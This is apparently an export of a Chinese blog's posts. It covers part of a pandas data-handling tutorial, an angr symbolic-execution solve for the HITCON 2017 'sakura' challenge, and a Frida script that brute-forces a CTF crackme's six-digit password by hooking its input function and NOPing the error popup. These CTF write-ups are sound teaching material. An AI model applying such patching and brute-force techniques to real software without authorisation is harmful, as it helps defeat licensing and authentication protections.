<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.cut(d[<span class="string">&#x27;C&#x27;</span>], [-<span class="number">100</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">100</span>])</span><br><span class="line">c0    (<span class="number">30.0</span>, <span class="number">100.0</span>]</span><br><span class="line">c1              NaN</span><br><span class="line">c2     (<span class="number">20.0</span>, <span class="number">30.0</span>]</span><br><span class="line">c3    (<span class="number">30.0</span>, <span class="number">100.0</span>]</span><br><span class="line">c4    (<span class="number">30.0</span>, <span class="number">100.0</span>]</span><br><span class="line">Name: C, dtype: category</span><br><span class="line">Categories (<span class="number">4</span>, interval[int64]): [(-<span class="number">100</span>, <span class="number">0</span>] &lt; (<span class="number">0</span>, <span class="number">20</span>] &lt; (<span class="number">20</span>, <span class="number">30</span>] &lt; (<span class="number">30</span>, <span class="number">100</span>]]</span><br></pre></td></tr></table></figure></li>
<li><p><code>.value_counts()</code>可计算每组数据个数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动分组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.qcut(d[<span class="string">&#x27;C&#x27;</span>], <span class="number">5</span>).value_counts()</span><br><span class="line">(<span class="number">61.805</span>, <span class="number">78.097</span>]      <span class="number">1</span></span><br><span class="line">(<span class="number">41.535</span>, <span class="number">61.805</span>]      <span class="number">1</span></span><br><span class="line">(<span class="number">27.518</span>, <span class="number">41.535</span>]      <span class="number">1</span></span><br><span class="line">(-<span class="number">6.924</span>, <span class="number">27.518</span>]      <span class="number">1</span></span><br><span class="line">(-<span class="number">125.382</span>, -<span class="number">6.924</span>]    <span class="number">1</span></span><br><span class="line">Name: C, dtype: int64</span><br><span class="line"><span class="comment"># 自定义分组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.cut(d[<span class="string">&#x27;C&#x27;</span>], [-<span class="number">100</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">100</span>]).value_counts()</span><br><span class="line">(<span class="number">30</span>, <span class="number">100</span>]    <span class="number">3</span></span><br><span class="line">(<span class="number">20</span>, <span class="number">30</span>]     <span class="number">1</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">20</span>]      <span class="number">0</span></span><br><span class="line">(-<span class="number">100</span>, <span class="number">0</span>]    <span class="number">0</span></span><br><span class="line">Name: C, dtype: int64</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="分组转换为one-hot编码"><a href="#分组转换为one-hot编码" class="headerlink" title="分组转换为one-hot编码"></a>分组转换为one-hot编码</h3><p>one-hot编码即每个类别生成一个布尔列，样本位于该类别中，则对应的布尔值为<code>true</code>，反之为<code>false</code></p>
<ul>
<li><p><code>pandas.get_dummies(data, prefix=None)</code>可将分组结果转换为one-hot编码</p>
<ul>
<li><code>prefix</code>：分组名</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.get_dummies(pd.qcut(d[<span class="string">&#x27;C&#x27;</span>], <span class="number">5</span>))</span><br><span class="line">    (-<span class="number">125.382</span>, -<span class="number">6.924</span>]  (-<span class="number">6.924</span>, <span class="number">27.518</span>]  (<span class="number">27.518</span>, <span class="number">41.535</span>]  (<span class="number">41.535</span>, <span class="number">61.805</span>]  (<span class="number">61.805</span>, <span class="number">78.097</span>]</span><br><span class="line">c0                   <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">1</span>                 <span class="number">0</span>                 <span class="number">0</span></span><br><span class="line">c1                   <span class="number">1</span>                 <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">0</span></span><br><span class="line">c2                   <span class="number">0</span>                 <span class="number">1</span>                 <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">0</span></span><br><span class="line">c3                   <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">1</span></span><br><span class="line">c4                   <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">0</span>                 <span class="number">1</span>                 <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.get_dummies(pd.qcut(d[<span class="string">&#x27;C&#x27;</span>], <span class="number">5</span>), prefix=<span class="string">&#x27;section&#x27;</span>)</span><br><span class="line">    section_(-<span class="number">125.382</span>, -<span class="number">6.924</span>]  section_(-<span class="number">6.924</span>, <span class="number">27.518</span>]  ...  section_(<span class="number">41.535</span>, <span class="number">61.805</span>]  section_(<span class="number">61.805</span>, <span class="number">78.097</span>]</span><br><span class="line">c0                           <span class="number">0</span>                         <span class="number">0</span>  ...                         <span class="number">0</span>                         <span class="number">0</span></span><br><span class="line">c1                           <span class="number">1</span>                         <span class="number">0</span>  ...                         <span class="number">0</span>                         <span class="number">0</span></span><br><span class="line">c2                           <span class="number">0</span>                         <span class="number">1</span>  ...                         <span class="number">0</span>                         <span class="number">0</span></span><br><span class="line">c3                           <span class="number">0</span>                         <span class="number">0</span>  ...                         <span class="number">0</span>                         <span class="number">1</span></span><br><span class="line">c4                           <span class="number">0</span>                         <span class="number">0</span>  ...                         <span class="number">1</span>                         <span class="number">0</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h2 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h2><h3 id="按方向合并"><a href="#按方向合并" class="headerlink" title="按方向合并"></a>按方向合并</h3><ul>
<li><p><code>pandas.concat([data1, data2], axis=0)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dd = pd.get_dummies(pd.qcut(d[<span class="string">&#x27;C&#x27;</span>], <span class="number">5</span>), prefix=<span class="string">&#x27;section&#x27;</span>)</span><br><span class="line"><span class="comment"># 列不同，行相同，按行拼接</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.concat([d, dd], axis=<span class="number">1</span>)</span><br><span class="line">             A          B           C  ...  section_(<span class="number">27.518</span>, <span class="number">41.535</span>]  section_(<span class="number">41.535</span>, <span class="number">61.805</span>]  section_(<span class="number">61.805</span>, <span class="number">78.097</span>]</span><br><span class="line">c0   -<span class="number">5.011405</span>  <span class="number">51.598027</span>   <span class="number">30.736787</span>  ...                         <span class="number">1</span>                         <span class="number">0</span>                         <span class="number">0</span></span><br><span class="line">c1  <span class="number">103.312304</span> -<span class="number">40.163837</span> -<span class="number">125.380597</span>  ...                         <span class="number">0</span>                         <span class="number">0</span>                         <span class="number">0</span></span><br><span class="line">c2  -<span class="number">44.149836</span>  <span class="number">40.952584</span>   <span class="number">22.689684</span>  ...                         <span class="number">0</span>                         <span class="number">0</span>                         <span class="number">0</span></span><br><span class="line">c3  <span class="number">115.680639</span>  -<span class="number">7.897926</span>   <span class="number">78.096531</span>  ...                         <span class="number">0</span>                         <span class="number">0</span>                         <span class="number">1</span></span><br><span class="line">c4   <span class="number">32.387194</span> -<span class="number">16.200097</span>   <span class="number">57.731634</span>  ...                         <span class="number">0</span>                         <span class="number">1</span>                         <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[<span class="number">5</span> rows x <span class="number">9</span> columns]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按列拼接</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.concat([d, dd], axis=<span class="number">0</span>)</span><br><span class="line">             A          B           C  ...  section_(<span class="number">27.518</span>, <span class="number">41.535</span>]  section_(<span class="number">41.535</span>, <span class="number">61.805</span>]  section_(<span class="number">61.805</span>, <span class="number">78.097</span>]</span><br><span class="line">c0   -<span class="number">5.011405</span>  <span class="number">51.598027</span>   <span class="number">30.736787</span>  ...                       NaN                       NaN                       NaN</span><br><span class="line">c1  <span class="number">103.312304</span> -<span class="number">40.163837</span> -<span class="number">125.380597</span>  ...                       NaN                       NaN                       NaN</span><br><span class="line">c2  -<span class="number">44.149836</span>  <span class="number">40.952584</span>   <span class="number">22.689684</span>  ...                       NaN                       NaN                       NaN</span><br><span class="line">c3  <span class="number">115.680639</span>  -<span class="number">7.897926</span>   <span class="number">78.096531</span>  ...                       NaN                       NaN                       NaN</span><br><span class="line">c4   <span class="number">32.387194</span> -<span class="number">16.200097</span>   <span class="number">57.731634</span>  ...                       NaN                       NaN                       NaN</span><br><span class="line">c0         NaN        NaN         NaN  ...                       <span class="number">1.0</span>                       <span class="number">0.0</span>                       <span class="number">0.0</span></span><br><span class="line">c1         NaN        NaN         NaN  ...                       <span class="number">0.0</span>                       <span class="number">0.0</span>                       <span class="number">0.0</span></span><br><span class="line">c2         NaN        NaN         NaN  ...                       <span class="number">0.0</span>                       <span class="number">0.0</span>                       <span class="number">0.0</span></span><br><span class="line">c3         NaN        NaN         NaN  ...                       <span class="number">0.0</span>                       <span class="number">0.0</span>                       <span class="number">1.0</span></span><br><span class="line">c4         NaN        NaN         NaN  ...                       <span class="number">0.0</span>                       <span class="number">1.0</span>                       <span class="number">0.0</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="按索引合并"><a href="#按索引合并" class="headerlink" title="按索引合并"></a>按索引合并</h3><ul>
<li><code>pd.merge(left, right, how=&#39;inner&#39;, on=None)</code><ul>
<li><code>left</code>：左表</li>
<li><code>right</code>：右表</li>
<li><code>how</code>：如何拼接，一般填<code>&#39;inner&#39;</code></li>
<li><code>on</code>：按哪个索引拼接</li>
</ul>
</li>
</ul>
<h4 id="inner"><a href="#inner" class="headerlink" title="inner"></a>inner</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>默认情况下内连接，以<code>key1</code>和<code>key2</code>作为连接键，保留共有键，即左边的字段（A、B）来自于左表，右边的字段（C、D）来自于右表，中间字段（key1、key2）两表取共有</p>
<p><img src="/2021/02/17/Pandas%E5%BA%93%E8%BF%9B%E9%98%B6/1.png"></p>
<h4 id="left"><a href="#left" class="headerlink" title="left"></a>left</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>以左表为基准进行连接，左表全部保留，右边有的直接填，没有的就填NaN</p>
<p><img src="/2021/02/17/Pandas%E5%BA%93%E8%BF%9B%E9%98%B6/2.png"></p>
<h4 id="right"><a href="#right" class="headerlink" title="right"></a>right</h4><h4 id><a href="#" class="headerlink" title></a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.merge(left, right, how=<span class="string">&#x27;right&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>以右表为基准进行连接，右表全部保留，左表有的直接填，没有的就填NaN</p>
<p><img src="/2021/02/17/Pandas%E5%BA%93%E8%BF%9B%E9%98%B6/3.png"></p>
<h4 id="outer"><a href="#outer" class="headerlink" title="outer"></a>outer</h4><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pd.merge(left, right, how=<span class="string">&#x27;outer&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>左右两个表有的键都保留，没有的都填NaN</p>
<p><img src="/2021/02/17/Pandas%E5%BA%93%E8%BF%9B%E9%98%B6/4.png"></p>
<h2 id="交叉表与透视表"><a href="#交叉表与透视表" class="headerlink" title="交叉表与透视表"></a>交叉表与透视表</h2><ul>
<li><p>交叉表：用于计算一列数据对于另一列数据的分组个数（寻找两列之间的关系）</p>
<ul>
<li><code>pandas.crosstab(value1, value2)</code><ul>
<li><code>value1</code>：列数据1</li>
<li><code>value2</code>：列数据2</li>
</ul>
</li>
</ul>
</li>
<li><p>透视表：相比于交叉表更简便</p>
<ul>
<li><code>DataFrame.pivot_table([], index=[])</code></li>
</ul>
</li>
</ul>
<h2 id="分组与聚合"><a href="#分组与聚合" class="headerlink" title="分组与聚合"></a>分组与聚合</h2><p>先分组，后聚合，只有完成聚合之后才能显示</p>
<ul>
<li>分组<ul>
<li><code>DataFrame.groupby(by=key, as_index=False)</code><ul>
<li><code>key</code>：分组的列数据，可以多个</li>
</ul>
</li>
</ul>
</li>
<li>聚合<ul>
<li>各个统计函数</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>数据分析</tag>
      </tags>
  </entry>
  <entry>
    <title>angr入门小试（二）</title>
    <url>/2021/02/14/angr%E5%85%A5%E9%97%A8%E5%B0%8F%E8%AF%95%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>CTF Hitcon 2017 - sakura</p>
<a id="more"></a>


<h2 id="Hitcon-2017-sakura"><a href="#Hitcon-2017-sakura" class="headerlink" title="Hitcon 2017: sakura"></a>Hitcon 2017: sakura</h2><h3 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一共读取400个字节到缓冲区中</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a2 = (<span class="keyword">char</span> **)((<span class="keyword">char</span> *)&amp;unk_2121E0 + <span class="number">20</span> * i);</span><br><span class="line">    read(<span class="number">0</span>, a2, <span class="number">0x14</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)sub_850((__int64)&amp;unk_2121E0) ) <span class="comment">// 验证函数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hitcon&#123;&quot;</span>);</span><br><span class="line">    sub_10FF6(<span class="string">&quot;hitcon&#123;&quot;</span>, a2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在验证函数<code>sub_850</code>中非常复杂，每一块的验证逻辑又大致相同。验证失败时，会将<code>[rbp+var_1E49]</code>置0，整个验证函数最后会返回<code>[rbp+var_1E49]</code>，此值为1时，验证通过</p>
<p>由于开了<code>pie</code>，在IDA中显示的是RVA，先通过idapython将<code>[rbp+var_1E49]</code>的RVA全部找出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x0850</span></span><br><span class="line">end_addr = <span class="number">0x010FF5</span></span><br><span class="line">p = start_addr</span><br><span class="line"></span><br><span class="line">avoid_offset = []</span><br><span class="line"><span class="keyword">while</span> p &lt;= end_addr:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;mov     [rbp+var_1E49], 0&#x27;</span> <span class="keyword">in</span> idc.GetDisasm(p):</span><br><span class="line">        avoid_offset.append(p)</span><br><span class="line">    p = idc.next_head(p)</span><br><span class="line">print(avoid_offset)</span><br></pre></td></tr></table></figure>
<p>在angr中，可以设置入口位置在<code>ImageBase + 0x110BA</code>上，然后将400字节的内容直接放在<code>ImageBase + 0x2121E0</code>处</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:00000000000110BA</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">rdi</span>, <span class="selector-tag">unk_2121E0</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:00000000000110C1</span>                 <span class="selector-tag">call</span>    <span class="selector-tag">sub_850</span></span><br></pre></td></tr></table></figure>
<p>验证通过后会调用<code>sub_10FF6</code>来打印flag信息，如下将<code>byte_212040</code>地址的400字节通过sha256转到<code>v2</code>中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_10FF6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  SHA256(byte_212040, <span class="number">400LL</span>, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, (<span class="keyword">unsigned</span> __int8)v2[i]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">image_base = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">avoid_offset = [...]</span><br><span class="line">avoid_offset.append(<span class="number">0x0110EC</span>)</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;sakura&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=(image_base + <span class="number">0x110BA</span>))</span><br><span class="line"></span><br><span class="line">data, ret_size = state.posix.get_fd(sys.stdin.fileno()).read_data(<span class="number">400</span>)</span><br><span class="line">state.memory.store(image_base + <span class="number">0x2121E0</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting state</span></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line">simgr.one_active.options.add(angr.options.LAZY_SOLVES)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=(image_base + <span class="number">0x00110CA</span>), avoid=[item + image_base <span class="keyword">for</span> item <span class="keyword">in</span> avoid_offset])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取执行路径上byte_212040地址处的400字节内容</span></span><br><span class="line">text = simgr.one_found.solver.<span class="built_in">eval</span>(simgr.one_found.memory.load(image_base + <span class="number">0x212040</span>, <span class="number">400</span>), cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">print(hashlib.sha256(text).hexdigest())</span><br></pre></td></tr></table></figure>
<p>运行结果及时间如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace$ time python3 exp.py </span><br><span class="line">6c0d62189adfd27a12289890d5b89c0dc8098bc976ecc3f6d61ec0429cccae61</span><br><span class="line"></span><br><span class="line">real	0m48.518s</span><br><span class="line">user	0m47.992s</span><br><span class="line">sys	0m0.526s</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>frida爆破小试</title>
    <url>/2021/02/08/frida%E7%88%86%E7%A0%B4%E5%B0%8F%E8%AF%95/</url>
    <content><![CDATA[<p>frida爆破小试：一道非常简单的CTF题</p>
<a id="more"></a>


<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>参考：<a href="https://bbs.pediy.com/thread-259069.htm">https://bbs.pediy.com/thread-259069.htm</a></p>
<p>输入6位密码，正确则获得flag</p>
<p><img src="/2021/02/08/frida%E7%88%86%E7%A0%B4%E5%B0%8F%E8%AF%95/1.png"></p>
<h2 id="frida爆破"><a href="#frida爆破" class="headerlink" title="frida爆破"></a>frida爆破</h2><h3 id="寻找相关函数"><a href="#寻找相关函数" class="headerlink" title="寻找相关函数"></a>寻找相关函数</h3><p>逆向分析部不是重点，仅给出结论</p>
<ul>
<li>确认按钮响应函数地址：<code>0x40173A</code></li>
<li>获得文本框内容函数地址：<code>0x41B3F0</code>，返回值eax存储着字符串首地址</li>
<li>弹窗函数地址：<code>0x004017D4</code>与<code>0x00401C03</code></li>
</ul>
<h3 id="模拟点击确认按钮"><a href="#模拟点击确认按钮" class="headerlink" title="模拟点击确认按钮"></a>模拟点击确认按钮</h3><ol>
<li>使用<code>NativeFunction(address, returnType, argTypes[, abi])</code>来创建一个<strong>Native</strong>函数</li>
<li>使用<code>rpc</code>调用，调用创建的<code>NativeFunction</code>函数</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 模拟点击</span></span><br><span class="line"><span class="keyword">var</span> OnClick_40173A = ptr(<span class="string">&#x27;0x40173A&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> OnClick_Func = <span class="keyword">new</span> NativeFunction(OnClick_40173A, <span class="string">&#x27;void&#x27;</span>, []);</span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    click : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        OnClick_Func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当hook上目标之后，在Py代码部分使用<code>script.exports.click()</code>模拟点击按钮的动作</p>
<h3 id="获取并设置文本框内容"><a href="#获取并设置文本框内容" class="headerlink" title="获取并设置文本框内容"></a>获取并设置文本框内容</h3><p>需要说明的是，调用链上会有先后两次进入<code>GetInput_41B3F0</code>函数（第一次获取文本判空，第二次才是处理内容），这里做个简单处理即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Hook获取并设置文本框内容</span></span><br><span class="line"><span class="keyword">var</span> key_num = <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">var</span> need_update = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> GetInput_41B3F0 = ptr(<span class="string">&#x27;0x41B3F0&#x27;</span>);</span><br><span class="line">Interceptor.attach(GetInput_41B3F0, &#123;</span><br><span class="line">    onLeave : <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(key_num &lt; <span class="number">1000000</span>) &#123;</span><br><span class="line">            <span class="comment">// console.log(Memory.readAnsiString(ptr(retval.toInt32())));</span></span><br><span class="line">            Memory.writeAnsiString(ptr(retval.toInt32()), key_num.toString());</span><br><span class="line">            <span class="comment">// console.log(Memory.readAnsiString(ptr(retval.toInt32())));</span></span><br><span class="line">            <span class="keyword">if</span>(need_update) &#123;</span><br><span class="line">                <span class="comment">// 第二次离开该函数时，更新key_num</span></span><br><span class="line">                key_num++;</span><br><span class="line">            &#125;</span><br><span class="line">            need_update = !need_update;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<h3 id="nop掉错误弹窗"><a href="#nop掉错误弹窗" class="headerlink" title="nop掉错误弹窗"></a>nop掉错误弹窗</h3><p>错误弹窗有两个，<code>0x00401C03</code>是密码错误的弹窗，另一个是未输入密码的弹窗，nop掉密码错误的就行，需要注意的地方也就是要设置下代码段属性</p>
<p><img src="/2021/02/08/frida%E7%88%86%E7%A0%B4%E5%B0%8F%E8%AF%95/2.png"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> msg_func2 = ptr(<span class="string">&#x27;0x00401C03&#x27;</span>);</span><br><span class="line">Memory.protect(msg_func2, <span class="number">5</span>, <span class="string">&#x27;rwx&#x27;</span>)</span><br><span class="line">Memory.writeByteArray(msg_func2, [<span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>])</span><br></pre></td></tr></table></figure>


<h2 id="完整代码及结果"><a href="#完整代码及结果" class="headerlink" title="完整代码及结果"></a>完整代码及结果</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    print(<span class="string">&quot;[on_message] message:&quot;</span>, message, <span class="string">&quot;data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHook</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, target_process, on_message_func = on_message</span>):</span></span><br><span class="line">        self.__session = frida.attach(target_process)</span><br><span class="line">        self.__on_message_func = on_message_func</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hook</span>(<span class="params">self, script</span>):</span></span><br><span class="line">        self.__script = self.__session.create_script(script)</span><br><span class="line">        self.__script.on(<span class="string">&quot;message&quot;</span>, self.__on_message_func)</span><br><span class="line">        self.__script.load()</span><br><span class="line">        print(<span class="string">&quot;Hooking...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># working...</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.__script.exports.click()</span><br><span class="line"></span><br><span class="line">        sys.stdin.read()</span><br><span class="line">        self.__session.detach()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Js脚本</span></span><br><span class="line">script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">// 模拟点击</span></span><br><span class="line"><span class="string">var OnClick_40173A = ptr(&#x27;0x40173A&#x27;);</span></span><br><span class="line"><span class="string">var OnClick_Func = new NativeFunction(OnClick_40173A, &#x27;void&#x27;, []);</span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string">    click : function() &#123;</span></span><br><span class="line"><span class="string">        OnClick_Func();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Hook获取并设置文本框内容</span></span><br><span class="line"><span class="string">var key_num = 730000;</span></span><br><span class="line"><span class="string">var need_update = false;</span></span><br><span class="line"><span class="string">var GetInput_41B3F0 = ptr(&#x27;0x41B3F0&#x27;);</span></span><br><span class="line"><span class="string">Interceptor.attach(GetInput_41B3F0, &#123;</span></span><br><span class="line"><span class="string">    onLeave : function(retval) &#123;</span></span><br><span class="line"><span class="string">        if(key_num &lt; 1000000) &#123;</span></span><br><span class="line"><span class="string">            Memory.writeAnsiString(ptr(retval.toInt32()), key_num.toString());</span></span><br><span class="line"><span class="string">            if(need_update) &#123;</span></span><br><span class="line"><span class="string">                console.log(&#x27;Testing number = &#x27; + Memory.readAnsiString(ptr(retval.toInt32())));</span></span><br><span class="line"><span class="string">                key_num++;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            need_update = !need_update;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// nop掉错误弹窗</span></span><br><span class="line"><span class="string">var msg_func2 = ptr(&#x27;0x00401C03&#x27;);</span></span><br><span class="line"><span class="string">Memory.protect(msg_func2, 5, &#x27;rwx&#x27;)</span></span><br><span class="line"><span class="string">Memory.writeByteArray(msg_func2, [0x90, 0x90, 0x90, 0x90, 0x90])</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&quot;Usage example.py &lt;target&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">            target = sys.argv[<span class="number">1</span>]</span><br><span class="line">        myhook = MyHook(target)</span><br><span class="line">        myhook.hook(script)</span><br></pre></td></tr></table></figure>


<p><img src="/2021/02/08/frida%E7%88%86%E7%A0%B4%E5%B0%8F%E8%AF%95/3.png"></p>
]]></content>
      <categories>
        <category>攻防相关</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>angr入门小试</title>
    <url>/2021/02/12/angr%E5%85%A5%E9%97%A8%E5%B0%8F%E8%AF%95/</url>
    <content><![CDATA[<p>angr 入门小试</p>
<a id="more"></a>

